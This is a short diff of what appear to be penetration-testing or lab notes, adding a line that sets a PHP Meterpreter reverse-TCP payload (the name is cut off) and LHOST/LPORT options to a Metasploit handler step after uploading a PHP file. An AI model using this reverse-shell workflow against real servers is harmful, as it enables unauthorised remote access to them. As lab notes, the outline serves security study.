@@ -272,7 +272,8 @@ add <?php .... ?>
 upload  
 msfconsole  
 use exploit/multi/handler
-add options 
+set payload php/meterpreter/reverse_tc
+add options (LHOST LPORT)  
 run
 
 
